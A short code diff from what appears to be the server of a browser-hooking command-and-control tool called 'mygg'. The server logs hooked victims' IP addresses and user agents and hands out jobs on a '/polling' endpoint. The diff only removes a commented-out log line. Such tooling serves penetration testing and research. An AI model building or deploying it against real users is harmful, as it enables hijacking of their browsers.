@@ -89,7 +89,6 @@ https.createServer(https_options, function (req, res) {
         console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
     /* Hooked browser asks mygg if there are any new jobs for it */
     } else if (req.url == '/polling') {
-        //console.log(tasks_pending);
         res.setHeader('Access-Control-Allow-Origin', '*')
         res.setHeader('Access-Control-Allow-Headers', '*')
         res.setHeader('Content-Type', 'application/json')
